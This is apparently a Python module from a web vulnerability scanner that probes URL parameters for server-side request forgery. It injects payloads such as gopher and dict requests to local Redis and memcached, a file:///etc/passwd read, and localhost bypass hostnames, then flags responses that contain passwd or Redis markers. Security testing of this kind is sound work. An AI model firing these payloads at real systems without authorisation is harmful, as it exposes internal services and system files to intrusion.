"""Advanced SSRF: protocol smuggling, DNS rebinding, gopher, dict, file."""
from core.http import get
from core.findings import Finding
from core.memory import log_event
import urllib.parse

SSRF_PROTOS = [
    "gopher://127.0.0.1:6379/_INFO",
    "dict://127.0.0.1:11211/stat",
    "file:///etc/passwd",
    "ftp://127.0.0.1/",
    "tftp://127.0.0.1/",
    "ldap://127.0.0.1/",
    "sftp://127.0.0.1/",
]

def scan_url(url):
    findings = []
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query)
    test_params = list(qs.keys()) if qs else []
    if not test_params:
        return findings
    for param in test_params:
        for payload in SSRF_PROTOS:
            q = dict(qs); q[param] = [payload]
            r = get(parsed._replace(query=urllib.parse.urlencode(q, doseq=True)).geturl())
            if r.status == 0:
                continue
            text = r.text or ""
            if any(m in text for m in ["root:x:", "redis_version", "STAT", "uid=", "daemon:x:"]):
                findings.append(Finding(
                    id=f"ssrf-adv-{hash(url+payload) & 0xffff:x}",
                    target=parsed.netloc,
                    type="SSRF (protocol smuggling)",
                    severity="high",
                    url=url,
                    parameter=param,
                    payload=payload,
                    evidence="Internal service response",
                    response_snippet=r.snippet(300),
                    confidence=0.75,
                ))
                break
        # DNS rebinding hint: 127.0.0.1.nip.io
        for payload in ["http://127.0.0.1.nip.io/", "http://localtest.me/", "http://127.1/"]:
            q = dict(qs); q[param] = [payload]
            r = get(parsed._replace(query=urllib.parse.urlencode(q, doseq=True)).geturl())
            if r.status != 0 and r.status == 200:
                # only report if different from baseline
                base = get(url)
                if base.text != r.text:
                    findings.append(Finding(
                        id=f"ssrf-rebind-{hash(url+payload) & 0xffff:x}",
                        target=parsed.netloc,
                        type="SSRF (DNS rebinding candidate)",
                        severity="medium",
                        url=url,
                        parameter=param,
                        payload=payload,
                        evidence="Alternative localhost representation accepted",
                        response_snippet=r.snippet(200),
                        confidence=0.4,
                    ))
                    break
    log_event(parsed.netloc, "ssrf_advanced_scan", {"url": url, "findings": len(findings)})
    return findings
